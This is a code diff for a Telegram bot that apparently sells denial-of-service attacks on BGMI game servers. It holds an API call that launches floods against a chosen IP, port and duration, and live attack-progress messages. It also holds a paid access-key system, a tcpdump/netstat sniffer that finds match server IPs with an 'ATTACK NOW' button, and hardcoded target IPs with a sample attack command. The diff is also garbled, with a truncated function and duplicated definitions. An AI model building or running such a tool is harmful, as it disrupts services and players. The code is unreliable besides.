@@ -356,6 +356,466 @@ def live_packet_sniffer(chat_id, user_id, message_id):
 
 def launch_api(ip, port, dur):
     try:
+        r = requests.get(
+            f"{API_URL}/hit",
+            params={"token": API_KEY, "ip": ip, "port": port, "time": dur},
+            timeout=300
+        )
+        logger.info(f"API Response [{r.status_code}]: {r.text[:300]}")
+        if not r.text.strip():
+            return {"success": False, "error": f"Empty response (HTTP {r.status_code})"}
+        try:
+            return r.json()
+        except Exception:
+            return {"success": False, "error": f"HTTP {r.status_code}: {r.text[:200]}"}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+def admin_only(fn):
+    @wraps(fn)
+    async def wrapper(update: Update, ctx: ContextTypes.DEFAULT_TYPE, *a, **kw):
+        if update.effective_user.id not in ADMIN_IDS:
+            await update.message.reply_text("❌ *Access Denied*\n\nThis command is for administrators only.", parse_mode="Markdown")
+            return
+        return await fn(update, ctx, *a, **kw)
+    return wrapper
+
+async def check_joined(uid, ctx):
+    if not CHANNEL_ID: return True
+    try:
+        m = await ctx.bot.get_chat_member(chat_id=int(CHANNEL_ID), user_id=uid)
+        joined = m.status in ("member", "administrator", "creator")
+        
+        return joined
+    except Exception as e:
+        logger.error(f"Channel check: {e}")
+        return False
+
+async def run_attack(update: Update, ctx: ContextTypes.DEFAULT_TYPE, uid: int, ip: str, port: int, dur: int, msg):
+    """Background task to run attack with live countdown"""
+    try:
+        await msg.edit_text(
+            f"🚀 *INITIATING ATTACK* 🚀\n\n"
+            f"🎯 Target: `{ip}:{port}`\n"
+            f"⏱️ Duration: `{dur}s`\n"
+            f"📡 Status: `Contacting server...`",
+            parse_mode="Markdown",
+            reply_markup=get_support_keyboard()
+        )
+        
+        resp = launch_api(ip, port, dur)
+        
+        if resp.get("success"):
+            attack_data = resp.get("attack", {})
+            attack_id = attack_data.get("id")
+            ends_at_str = attack_data.get("endsAt")
+            
+            if ends_at_str:
+                ends_at_str = ends_at_str.replace('Z', '+00:00')
+                ends_at = datetime.fromisoformat(ends_at_str)
+                current_time = utc_now()
+                actual_duration = max(1, int((ends_at - current_time).total_seconds()))
+                if actual_duration > dur + 5:
+                    actual_duration = dur
+                end_timestamp = ends_at.timestamp()
+                start_time = end_timestamp - actual_duration
+            else:
+                start_time = time.time()
+                actual_duration = dur
+                end_timestamp = start_time + dur
+            
+            active_attacks[uid] = {
+                "end": end_timestamp,
+                "start_time": start_time,
+                "ip": ip,
+                "port": port,
+                "attack_id": attack_id,
+                "duration": actual_duration
+            }
+            
+            await msg.edit_text(
+                f"⚡ *ATTACK ACTIVE* ⚡\n\n"
+                f"🎯 Target: `{ip}:{port}`\n"
+                f"⏱️ Duration: `{actual_duration}s`\n"
+                f"🆔 Attack ID: `{attack_id[:8] if attack_id else 'N/A'}...`\n"
+                f"🔥 Status: `ATTACKING`\n\n"
+                f"`░░░░░░░░░░░░░░░░░░░░ 0%`\n"
+                f"⏰ Time Left: `{actual_duration}s`",
+                parse_mode="Markdown",
+                reply_markup=get_support_keyboard()
+            )
+            
+            # Live countdown loop
+            for remaining in range(actual_duration, -1, -1):
+                if remaining <= 0:
+                    break
+                
+                elapsed = actual_duration - remaining
+                pct = int((elapsed / actual_duration) * 100)
+                if pct > 100: pct = 100
+                
+                filled = int(pct / 5)
+                bar = "█" * filled + "░" * (20 - filled)
+                
+                minutes = remaining // 60
+                seconds = remaining % 60
+                time_display = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
+                
+                try:
+                    await msg.edit_text(
+                        f"⚡ *ATTACK IN PROGRESS* ⚡\n\n"
+                        f"🎯 Target: `{ip}:{port}`\n"
+                        f"📊 Progress: `{pct}%`\n"
+                        f"`{bar}`\n"
+                        f"⏰ Time Left: `{time_display}`\n"
+                        f"🆔 Attack ID: `{attack_id[:8] if attack_id else 'N/A'}...`\n"
+                        f"🔥 Status: `ATTACKING`\n\n"
+                        f"💡 Bot is responsive! Use other commands while attack runs.",
+                        parse_mode="Markdown",
+                        reply_markup=get_support_keyboard()
+                    )
+                except Exception as e:
+                    if "not modified" not in str(e).lower():
+                        logger.error(f"Edit error: {e}")
+                        break
+                
+                await asyncio.sleep(1)
+                
+                if uid not in active_attacks:
+                    logger.info(f"Attack {attack_id} was manually stopped")
+                    break
+            
+            # Attack completed
+            mins = actual_duration // 60
+            secs = actual_duration % 60
+            time_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
+            
+            await msg.edit_text(
+                f"✅ *ATTACK COMPLETE* ✅\n\n"
+                f"🎯 Target: `{ip}:{port}`\n"
+                f"⏱️ Duration: `{actual_duration}s` ({time_str})\n"
+   
+def utc_now():
+    return datetime.now(timezone.utc)
+
+def to_ist(dt):
+    if dt is None: return None
+    if dt.tzinfo is None: dt = dt.replace(tzinfo=timezone.utc)
+    return dt.astimezone(IST)
+
+def fmt_ist(dt):
+    if dt is None: return "N/A"
+    return to_ist(dt).strftime("%d %b %Y, %I:%M %p IST")
+
+def days_left(dt):
+    if dt is None: return 0
+    if dt.tzinfo is None: dt = dt.replace(tzinfo=timezone.utc)
+    return max(0, (dt - utc_now()).days)
+
+def gen_key(hours, uses):
+    rand = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(12))
+    return f"KEY-{rand}-{hours}H-{uses}U"
+
+def join_url():
+    if CHANNEL_INVITE: return CHANNEL_INVITE
+    if CHANNEL_USERNAME: return f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}"
+    return ""
+
+def get_support_keyboard():
+    keyboard = [
+        [InlineKeyboardButton("👑 𝗢𝗪𝗡𝗘𝗥 👑", url="https://t.me/RIYAZXERO")],
+        [InlineKeyboardButton("📢 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞 📢", url="https://t.me/RIYAZXEROVIP")],
+        [InlineKeyboardButton("💰 𝗣𝗥𝗢𝗢𝗙 💰", url="https://t.me/BOOGLE_LOADER")],
+    ]
+    return InlineKeyboardMarkup(keyboard)
+
+def main_menu_keyboard():
+    keyboard = [
+        [InlineKeyboardButton("🚀 Attack", callback_data="menu_attack"), InlineKeyboardButton("🎯 Live Sniff", callback_data="menu_live")],
+        [InlineKeyboardButton("📊 Stats", callback_data="menu_stats"), InlineKeyboardButton("🔑 Redeem", callback_data="menu_redeem")],
+        [InlineKeyboardButton("ℹ️ Info", callback_data="menu_info"), InlineKeyboardButton("🆘 Help", callback_data="menu_help")],
+    ]
+    return InlineKeyboardMarkup(keyboard)
+
+def join_keyboard():
+    kb = []
+    url = join_url()
+    if url: kb.append([InlineKeyboardButton("📢 Join Channel", url=url)])
+    kb.append([InlineKeyboardButton("✅ Verified", callback_data="verify_join")])
+    return InlineKeyboardMarkup(kb)
+
+class DB:
+    def __init__(self):
+        self.client = MongoClient(MONGODB_URI)
+        d = self.client[DATABASE_NAME]
+        self.users   = d.users
+        self.attacks = d.attacks
+        self.keys    = d.keys
+        self._indexes()
+
+    def _indexes(self):
+        try:
+            info = self.users.index_information()
+            if "user_id_1" in info:
+                self.users.drop_index("user_id_1")
+            self.users.create_index([("user_id", ASCENDING)], unique=True)
+            self.attacks.create_index([("timestamp", DESCENDING)])
+            self.attacks.create_index([("user_id", ASCENDING)])
+            self.keys.create_index([("key", ASCENDING)], unique=True)
+            self.keys.create_index([("is_active", ASCENDING)])
+        except Exception as e:
+            logger.error(f"Index error: {e}")
+
+    def get_user(self, uid):
+        return self.users.find_one({"user_id": uid})
+
+    def upsert_user(self, uid, username=None, first_name=None):
+        user = self.get_user(uid)
+        if user: return user
+        doc = {
+            "user_id": uid, "username": username, "first_name": first_name,
+            "approved": False, "expires_at": None, "total_attacks": 0,
+            "created_at": utc_now(), "joined_channel": False,
+            "redeemed_keys": []
+        }
+        try:
+            self.users.insert_one(doc)
+        except pymongo.errors.DuplicateKeyError:
+            doc = self.get_user(uid)
+        return doc
+
+    def is_approved(self, uid):
+        u = self.get_user(uid)
+        if not u or not u.get("approved"): return False
+        exp = u.get("expires_at")
+        if exp:
+            if exp.tzinfo is None: exp = exp.replace(tzinfo=timezone.utc)
+            if exp < utc_now(): return False
+        return True
+
+    def set_channel_status(self, uid, joined):
+        self.users.update_one({"user_id": uid}, {"$set": {"joined_channel": joined}})
+
+    def approve(self, uid, hours):
+        exp = utc_now() + timedelta(hours=hours)
+        user = self.get_user(uid)
+        if user and user.get("approved") and user.get("expires_at"):
+            old_exp = user["expires_at"]
+            if old_exp.tzinfo is None: old_exp = old_exp.replace(tzinfo=timezone.utc)
+            if old_exp > utc_now():
+                exp = old_exp + timedelta(hours=hours)
+        
+        self.users.update_one(
+            {"user_id": uid},
+            {"$set": {"approved": True, "expires_at": exp}},
+            upsert=True
+        )
+        return exp
+
+    def all_users(self):
+        return list(self.users.find())
+
+    def create_key(self, hours, uses, by):
+        key = gen_key(hours, uses)
+        exp = utc_now() + timedelta(hours=hours)
+        doc = {
+            "key": key, "hours": hours, "max_uses": uses,
+            "used_count": 0, "users_used": [],
+            "created_by": by, "created_at": utc_now(),
+            "expires_at": exp, "is_active": True
+        }
+        self.keys.insert_one(doc)
+        return doc
+
+    def redeem_key(self, key, uid):
+        kd = self.keys.find_one({"key": key, "is_active": True})
+        if not kd:
+            return {"ok": False, "err": "❌ Invalid or expired key."}
+        exp = kd["expires_at"]
+        if exp.tzinfo is None: exp = exp.replace(tzinfo=timezone.utc)
+        if exp < utc_now():
+            return {"ok": False, "err": "❌ This key has expired."}
+        
+        if uid in kd.get("users_used", []):
+            return {"ok": False, "err": "❌ You already redeemed this key."}
+        
+        if kd["used_count"] >= kd["max_uses"]:
+            return {"ok": False, "err": "❌ Key has reached its maximum uses."}
+        
+        new_exp = self.approve(uid, kd["hours"])
+        
+        self.users.update_one(
+            {"user_id": uid},
+            {"$push": {"redeemed_keys": key}}
+        )
+        
+        self.keys.update_one(
+            {"_id": kd["_id"]},
+            {"$inc": {"used_count": 1}, "$push": {"users_used": uid}}
+        )
+        return {"ok": True, "hours": kd["hours"], "expires_at": new_exp}
+
+    def list_keys(self, active_only=True):
+        q = {"is_active": True} if active_only else {}
+        return list(self.keys.find(q).sort("created_at", -1))
+
+    def deactivate_key(self, key):
+        r = self.keys.update_one({"key": key}, {"$set": {"is_active": False}})
+        return r.modified_count > 0
+    
+    def delete_all_keys(self):
+        result = self.keys.delete_many({})
+        return result.deleted_count
+    
+    def delete_keys_by_hours(self, hours):
+        result = self.keys.delete_many({"hours": hours})
+        return result.deleted_count
+    
+    def delete_used_keys(self):
+        result = self.keys.delete_many({"used_count": {"$gt": 0}})
+        return result.deleted_count
+    
+    def delete_unused_keys(self):
+        result = self.keys.delete_many({"used_count": 0})
+        return result.deleted_count
+
+    def log_attack(self, uid, ip, port, dur, status):
+        self.attacks.insert_one({
+            "_id": str(uuid.uuid4()), "user_id": uid,
+            "ip": ip, "port": port, "duration": dur,
+            "status": status, "timestamp": utc_now()
+        })
+        self.users.update_one({"user_id": uid}, {"$inc": {"total_attacks": 1}})
+
+    def user_stats(self, uid):
+        total   = self.attacks.count_documents({"user_id": uid})
+        success = self.attacks.count_documents({"user_id": uid, "status": "success"})
+        recent  = list(self.attacks.find({"user_id": uid}).sort("timestamp", -1).limit(5))
+        return {"total": total, "success": success, "failed": total - success, "recent": recent}
+    
+    def get_attack_logs(self, limit=50):
+        return list(self.attacks.find().sort("timestamp", -1).limit(limit))
+    
+    def get_user_redeemed_keys(self, uid):
+        user = self.get_user(uid)
+        return user.get("redeemed_keys", []) if user else []
+
+# ============ LIVE BGMI PACKET SNIFFER ============
+
+def live_packet_sniffer(chat_id, user_id, message_id):
+    """Main packet sniffer function"""
+    
+    sniffing_sessions[chat_id] = {'active': True, 'start_time': datetime.now()}
+    
+    try:
+        # Try tcpdump first
+        cmd = f"""timeout 35 tcpdump -i any -n -c 20 2>/dev/null | grep -E 'udp port (2701[5-9]|2702[0-5])' | head -10"""
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=40)
+        output = result.stdout
+        
+        # Extract IP addresses
+        ip_pattern = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
+        port_pattern = r'\.(\d{4,5})'
+        
+        ips = re.findall(ip_pattern, output)
+        ports = re.findall(port_pattern, output)
+        
+        # Filter BGMI server IPs
+        bgmi_ips = []
+        for ip in ips:
+            for bgmi_range in bgmi_ip_ranges:
+                if ip.startswith(bgmi_range):
+                    bgmi_ips.append(ip)
+                    break
+        
+        bgmi_ips = list(dict.fromkeys(bgmi_ips))
+        
+        if bgmi_ips:
+            target_ip = bgmi_ips[0]
+            target_port = 27015
+            
+            for port in ports:
+                if int(port) in bgmi_ports:
+                    target_port = int(port)
+                    break
+            
+            captured_targets[chat_id] = {'ip': target_ip, 'port': target_port, 'time': datetime.now()}
+            
+            markup = InlineKeyboardMarkup(row_width=2)
+            btn_attack = InlineKeyboardButton("⚡ ATTACK NOW", callback_data=f"quick_attack_{target_ip}_{target_port}")
+            btn_copy = InlineKeyboardButton("📋 COPY IP", callback_data=f"copy_ip_{target_ip}")
+            btn_recapture = InlineKeyboardButton("🔄 CAPTURE AGAIN", callback_data="live_start")
+            markup.add(btn_attack, btn_copy, btn_recapture)
+            
+            bot.edit_message_text(
+                f"✅ *BGMI MATCH DETECTED!* ✅\n\n"
+                f"🎯 **Server IP:** `{target_ip}`\n"
+                f"🔌 **Port:** `{target_port}`\n"
+                f"🕐 **Detected at:** {datetime.now().strftime('%H:%M:%S')}\n"
+                f"🌍 **Location:** Mumbai (AWS)\n\n"
+                f"⚡ **Ready to attack!** Click below:",
+                chat_id, message_id,
+                reply_markup=markup,
+                parse_mode='Markdown'
+            )
+            return
+        
+        # Fallback: netstat method
+        cmd2 = f"netstat -an 2>/dev/null | grep -E ':(2701[5-9]|2702[0-5])' | grep ESTABLISHED"
+        result2 = subprocess.run(cmd2, shell=True, capture_output=True, text=True, timeout=10)
+        lines = result2.stdout.strip().split('\n')
+        
+        for line in lines:
+            parts = line.split()
+            if len(parts) >= 4:
+                foreign = parts[3]
+                if ':' in foreign:
+                    ip_port = foreign.split(':')
+                    ip = ip_port[0]
+                    port = int(ip_port[1])
+                    for bgmi_range in bgmi_ip_ranges:
+                        if ip.startswith(bgmi_range) and port in bgmi_ports:
+                            captured_targets[chat_id] = {'ip': ip, 'port': port, 'time': datetime.now()}
+                            markup = InlineKeyboardMarkup()
+                            btn_attack = InlineKeyboardButton("⚡ ATTACK NOW", callback_data=f"quick_attack_{ip}_{port}")
+                            markup.add(btn_attack)
+                            bot.edit_message_text(
+                                f"✅ *BGMI Server Found!*\n\n🎯 IP: `{ip}`\n🔌 Port: `{port}`",
+                                chat_id, message_id,
+                                reply_markup=markup,
+                                parse_mode='Markdown'
+                            )
+                            return
+        
+        # No IP found
+        bot.edit_message_text(
+            "❌ *No BGMI Server Detected!* ❌\n\n"
+            "📌 **Troubleshooting:**\n"
+            "1️⃣ Make sure you're in a BGMI match\n"
+            "2️⃣ Wait 30 seconds then try again\n"
+            "3️⃣ Use VPN if on same network\n"
+            "4️⃣ Try `/live` again\n\n"
+            "💡 **Manual IPs:**\n"
+            "`15.206.145.78`\n`43.245.217.1`\n`13.232.255.1`",
+            chat_id, message_id,
+            parse_mode='Markdown'
+        )
+        
+    except Exception as e:
+        logger.error(f"Sniffer error: {e}")
+        bot.edit_message_text(
+            f"❌ *Error:* {str(e)[:100]}\n\n"
+            f"Try manual attack using:\n"
+            f"`/attack 15.206.145.78 27015 60`",
+            chat_id, message_id,
+            parse_mode='Markdown'
+        )
+    finally:
+        if chat_id in sniffing_sessions:
+            sniffing_sessions[chat_id]['active'] = False
+
+def launch_api(ip, port, dur):
+    try:
         r = requests.post(
             f"{API_URL}/api/v1/attack",
             json={"ip": ip, "port": port, "duration": dur},
